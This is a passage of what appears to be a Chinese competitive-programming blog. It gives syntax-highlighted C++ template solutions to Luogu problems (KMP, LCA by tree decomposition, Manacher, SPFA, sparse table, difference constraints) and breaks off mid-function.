class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e6</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">int</span> lens, lent, nex[N];</span><br><span class="line"><span class="type">char</span> s[N], t[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, t + <span class="number">1</span>);</span><br><span class="line">    lens = <span class="built_in">strlen</span>(s + <span class="number">1</span>);</span><br><span class="line">    lent = <span class="built_in">strlen</span>(t + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= lent; ++i) &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; t[j + <span class="number">1</span>] != t[i]) j = nex[j];</span><br><span class="line">        <span class="keyword">if</span> (t[j + <span class="number">1</span>] == t[i]) ++j;</span><br><span class="line">        nex[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= lens; ++i) &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; t[j + <span class="number">1</span>] != s[i]) j = nex[j];</span><br><span class="line">        <span class="keyword">if</span> (t[j + <span class="number">1</span>] == s[i]) ++j;</span><br><span class="line">        <span class="keyword">if</span> (j == lent) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i - j + <span class="number">1</span>), j = nex[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= lent; ++i) <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>, nex[i], <span class="string">&quot; \n&quot;</span>[i == lent]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="LCA（树剖）"><a href="#LCA（树剖）" class="headerlink" title="LCA（树剖）"></a>LCA（树剖）</h1><p><strong>洛谷P3379</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5e5</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">int</span> size[N], dep[N], fa[N], son[N], top[N], n, m, s;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> f)</span> </span>&#123;</span><br><span class="line">    fa[x] = f;</span><br><span class="line">    dep[x] = dep[f] + <span class="number">1</span>;</span><br><span class="line">    size[x] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> val : G[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val == f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs1</span>(val, x);</span><br><span class="line">        size[x] += size[val];</span><br><span class="line">        son[x] = size[val] &gt; size[son[x]] ? val : son[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> topf)</span> </span>&#123;</span><br><span class="line">    top[x] = topf;</span><br><span class="line">    <span class="keyword">if</span> (!son[x]) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">dfs2</span>(son[x], topf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> val : G[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val == son[x] || val == fa[x]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(val, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LCA</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (top[x] != top[y]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dep[top[x]] &lt; dep[top[y]]) <span class="built_in">swap</span>(x, y);</span><br><span class="line">        x = fa[top[x]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dep[x] &gt; dep[y] ? y : x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m, s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, x = <span class="number">0</span>, y = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(x, y);</span><br><span class="line">        G[x].<span class="built_in">push_back</span>(y);</span><br><span class="line">        G[y].<span class="built_in">push_back</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs1</span>(s, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">dfs2</span>(s, s);</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="built_in">read</span>(a, b);</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">LCA</span>(a, b)), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Manacher"><a href="#Manacher" class="headerlink" title="Manacher"></a>Manacher</h1><p><strong>洛谷P3805</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">11000009</span>;</span><br><span class="line"><span class="type">int</span> len, ans, e[N &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="type">char</span> T[N &lt;&lt; <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    T[<span class="number">0</span>] = <span class="string">&#x27;~&#x27;</span>, T[len = <span class="number">1</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">    <span class="type">char</span> c = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (c &lt; <span class="string">&#x27;a&#x27;</span> || c &gt; <span class="string">&#x27;z&#x27;</span>) c = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) T[++len] = c, T[++len] = <span class="string">&#x27;|&#x27;</span>, c = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, mid = <span class="number">0</span>, r = <span class="number">0</span>; i &lt;= len; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt;= r &amp;&amp; mid) e[i] = <span class="built_in">min</span>(e[(mid &lt;&lt; <span class="number">1</span>) - i], r - i + <span class="number">1</span>); <span class="comment">// 由对称性可得，min右边的那一项是因为原来的2*mid-i可能统计了超过一mid为中心的回文串的边缘</span></span><br><span class="line">        <span class="comment">// 而min为中心的回文串左右并不一样，所以要加min(r-i+1)</span></span><br><span class="line">        <span class="keyword">while</span> (T[i - e[i]] == T[e[i] + i]) ++e[i];<span class="comment">//暴力扩展</span></span><br><span class="line">        <span class="keyword">if</span> (e[i] + i &gt; r) mid = i, r = e[i] + i - <span class="number">1</span>;<span class="comment">//更新最右端</span></span><br><span class="line">        <span class="keyword">if</span> (ans &lt; e[i]) ans = e[i];<span class="comment">//更新答案</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(ans - <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="SPFA"><a href="#SPFA" class="headerlink" title="SPFA"></a>SPFA</h1><p><strong>洛谷P3385</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e3</span> + <span class="number">9</span>, M = <span class="number">3e3</span> + <span class="number">9</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EDGE</span>&#123;<span class="type">int</span> to, val;&#125;;</span><br><span class="line">vector&lt;EDGE&gt; G[N];</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; Q;</span><br><span class="line"><span class="type">int</span> dis[N], vis[N], cnt[N], T, n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SPFA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(cnt, <span class="number">0</span>, <span class="built_in">sizeof</span>(cnt));</span><br><span class="line">    <span class="keyword">while</span> (!Q.<span class="built_in">empty</span>()) Q.<span class="built_in">pop</span>();</span><br><span class="line">    dis[<span class="number">1</span>] = <span class="number">0</span>, vis[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    Q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> now = Q.<span class="built_in">front</span>();</span><br><span class="line">        Q.<span class="built_in">pop</span>();vis[now] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> val : G[now]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[now] + val.val &lt; dis[val.to]) &#123;</span><br><span class="line">                dis[val.to] = dis[now] + val.val;</span><br><span class="line">                cnt[val.to] = cnt[now] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (cnt[val.to] &gt;= n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (!vis[val.to]) Q.<span class="built_in">push</span>(val.to), vis[val.to] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(T);</span><br><span class="line">    <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">        <span class="built_in">read</span>(n, m);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            G[i].<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>, w = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            <span class="built_in">read</span>(u, v, w);</span><br><span class="line">            G[u].<span class="built_in">push_back</span>((EDGE)&#123;v, w&#125;);</span><br><span class="line">            <span class="keyword">if</span> (w &gt;= <span class="number">0</span>) G[v].<span class="built_in">push_back</span>((EDGE)&#123;u, w&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="built_in">SPFA</span>() ? <span class="string">&quot;NO&quot;</span> : <span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="ST表"><a href="#ST表" class="headerlink" title="ST表"></a>ST表</h1><p><strong>洛谷P3865</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">int</span> st[N][<span class="number">20</span>], rec[N], n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    rec[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(st[i][<span class="number">0</span>]);</span><br><span class="line">        rec[i] = rec[i &gt;&gt; <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> k = <span class="number">1</span>; (<span class="number">1</span> &lt;&lt; k) &lt;= n; ++k) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i + (<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span> &lt;= n; ++i) &#123;</span><br><span class="line">            st[i][k] = <span class="built_in">max</span>(st[i][k - <span class="number">1</span>], st[i + (<span class="number">1</span> &lt;&lt; (k - <span class="number">1</span>))][k - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="built_in">read</span>(l, r);</span><br><span class="line">        k = rec[r - l + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">max</span>(st[l][k], st[r - (<span class="number">1</span> &lt;&lt; k) + <span class="number">1</span>][k])), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="差分约束"><a href="#差分约束" class="headerlink" title="差分约束"></a>差分约束</h1><p><strong>洛谷P5960</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5e3</span> + <span class="number">9</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EDGE</span>&#123;<span class="type">int</span> to, val;&#125;;</span><br><span class="line">vector&lt;EDGE&gt; G[N];</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; Q;</span><br><span class="line"><span class="type">int</span> dis[N], vis[N], cnt[N], n, m;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SPFA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(dis));</span><br><span class="line">    vis[n + <span class="number">1</span>] = <span class="number">1</span>, dis[n + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    Q.<span class="built_in">push</span>(n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> x = Q.<span class="built_in">front</span>();</span><br><span class="line">        Q.<span class="built_in">pop</span>(); vis[x] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> val : G[x]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[x] + val.val &lt; dis[val.to]) &#123;</span><br><span class="line">                dis[val.to] = dis[x] + val.val;</span><br><span class="line">                cnt[val.to] = cnt[x] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (cnt[val.to] &gt;= n + <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (!vis[val.to]) vis[val.to] = <span class="number">1</span>, Q.<span class="built_in">push</span>(val.to);</span><br><span class="line">            